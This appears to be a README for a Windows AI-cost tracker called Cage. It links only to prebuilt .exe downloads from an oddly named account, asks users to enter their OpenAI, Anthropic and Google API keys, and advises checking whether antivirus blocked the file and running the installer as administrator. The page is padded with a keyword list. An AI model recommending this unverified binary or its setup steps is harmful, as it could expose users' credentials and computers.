# 📊 cage-ai-cost-tracker - Track AI Costs with Confidence

[![Download Latest Release](https://img.shields.io/badge/Download-Latest_Release-2ea44f?style=for-the-badge)](https://github.com/unstratifiedlanguagematriculate603/cage-ai-cost-tracker/releases)

Cage helps you measure how much you spend on AI services like ChatGPT, Claude, and Gemini. It compares AI costs to human work costs so you can see your real savings.

---

## 🚀 Getting Started

This guide shows you how to download and run Cage on your Windows computer. You do not need to know any programming.

### What You Need

- Windows 10 or Windows 11
- 500 MB of free disk space
- An internet connection

### System Check

Cage works on most modern Windows computers. If your computer runs Windows 10 or newer, you are ready.

---

## 📥 Download Cage

Visit the Cage releases page to get the latest version.

**[Download Cage for Windows](https://github.com/unstratifiedlanguagematriculate603/cage-ai-cost-tracker/releases)**

On the releases page:
1. Find the newest release at the top
2. Look for the file named `cage-windows.exe` or `cage-setup.exe`
3. Click the file name to start the download

---

## 💿 Install Cage

### Option 1: Run the Installer (Recommended)

1. Open the `cage-setup.exe` file you downloaded
2. Click "Yes" if Windows asks for permission
3. Follow the setup wizard steps
4. Choose where to install Cage (the default location works fine)
5. Click "Install"
6. Click "Finish" when done

### Option 2: Use the Portable Version

1. Download `cage-windows.exe`
2. Move the file to a folder you can find easily, like `C:\Cage`
3. Double-click the file to run Cage

---

## 🎯 First Run

When you start Cage for the first time:

1. A command window opens
2. Cage asks for your AI service API keys
3. Type your API key and press Enter

### Get Your API Keys

You need API keys for the AI services you use:

- **OpenAI (ChatGPT):** Visit platform.openai.com and create an API key
- **Anthropic (Claude):** Visit console.anthropic.com and create an API key
- **Google (Gemini):** Visit aistudio.google.com and create an API key

Cage stores your keys safely on your computer. It does not send them anywhere else.

---

## 📋 How Cage Works

Cage tracks every time you use an AI service. It records:

- How many requests you make
- How many tokens each request uses
- The total cost per request
- Which tools or agents you use

### Cost Comparison

Cage compares your AI costs to what a human worker would cost for the same task. This helps you understand your real savings.

For example:
- AI task cost: $0.50
- Human worker cost: $15.00
- Savings: $14.50

---

## 🛠️ Main Features

### Track AI Usage
Cage monitors all your AI service calls. It logs each request automatically.

### Calculate Savings
Cage compares AI costs to human work baselines. You see your savings in real time.

### Attribute Costs to Tools
If you use multiple AI tools, Cage shows which tools cost the most. You can see which tools save you the most money.

### Generate Reports
Cage creates simple reports you can view in the command window. Reports show:
- Total AI spending
- Spending per tool
- Savings compared to human work
- Usage trends over time

---

## ⌨️ Using Cage

Cage runs in the command prompt. Here are the basic commands:

### Check Your Usage
Type `cage report` and press Enter. Cage shows your current usage and costs.

### View Savings
Type `cage savings` and press Enter. Cage shows your savings compared to human work baselines.

### List Your Tools
Type `cage tools` and press Enter. Cage lists all the AI tools you use and their costs.

### Update Settings
Type `cage settings` and press Enter. Cage shows your current settings.

---

## 🔧 Common Tasks

### Add a New API Key
Type `cage add-key` and press Enter. Follow the prompts to add a new key.

### Remove an API Key
Type `cage remove-key` and press Enter. Choose which key to remove.

### Export Your Data
Type `cage export` and press Enter. Cage saves your data as a CSV file you can open in Excel.

### Reset Your Data
Type `cage reset` and press Enter. Cage deletes all saved data and starts fresh.

---

## ❓ Troubleshooting

### Cage Won't Start
- Make sure your antivirus did not block the file
- Try running the installer as administrator
- Download the file again if it seems damaged

### API Key Not Working
- Check the key is correct
- Make sure you copied the whole key
- Verify the key has not expired

### Command Not Found
- Close the command window and open a new one
- Make sure Cage is installed in the right location
- Try running `cage` from the install folder

### Reports Show No Data
- Check your API keys are set correctly
- Make sure you have used an AI service recently
- Run Cage for a few minutes to collect data

---

## 🔄 Updating Cage

Cage checks for updates when you start it. When an update is available:

1. Visit the [Cage releases page](https://github.com/unstratifiedlanguagematriculate603/cage-ai-cost-tracker/releases)
2. Download the new version
3. Run the installer
4. Your data stays safe during updates

---

## 📁 Where Cage Stores Data

Cage saves your data in a folder on your computer. You can find it at:

`C:\Users\[Your Username]\AppData\Local\Cage`

This folder contains:
- Your API keys (encrypted)
- Your usage logs
- Your settings file

Do not delete this folder unless you want to lose all your data.

---

## 🤝 Need Help?

If Cage does not work as expected, try these steps:

1. Restart Cage
2. Restart your computer
3. Download Cage again from the releases page

---

Keywords: AI cost tracker, LLM usage monitor, AI spending tool, cost savings calculator, AI tool attribution, human cost baseline, AI cost comparison, Windows AI tool